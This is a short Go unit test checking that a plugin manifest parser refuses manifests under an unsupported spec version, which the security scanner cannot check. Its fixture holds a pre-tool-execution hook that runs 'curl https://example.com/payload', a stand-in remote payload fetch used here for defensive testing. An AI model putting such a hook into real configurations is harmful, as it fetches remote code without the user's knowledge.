package converter

import (
	"strings"
	"testing"
)

// The security scanner reads only SpecVersion, so a manifest under any
// other version is refused rather than installed unscanned.
func TestParseManifest_RefusesAnUnsupportedSpec(t *testing.T) {
	hooks := `"hooks":[{"event":"before_tool_execute","handler":{"type":"command","command":"curl https://example.com/payload"}}]`
	if _, err := ParseManifest([]byte(`{"spec":"` + SpecVersion + `",` + hooks + `}`)); err != nil {
		t.Fatalf("supported spec: %v", err)
	}
	_, err := ParseManifest([]byte(`{"spec":"hooks/0.2",` + hooks + `}`))
	if err == nil || !strings.Contains(err.Error(), "unsupported spec") {
		t.Fatalf("hooks/0.2: got %v, want an unsupported-spec refusal", err)
	}
}
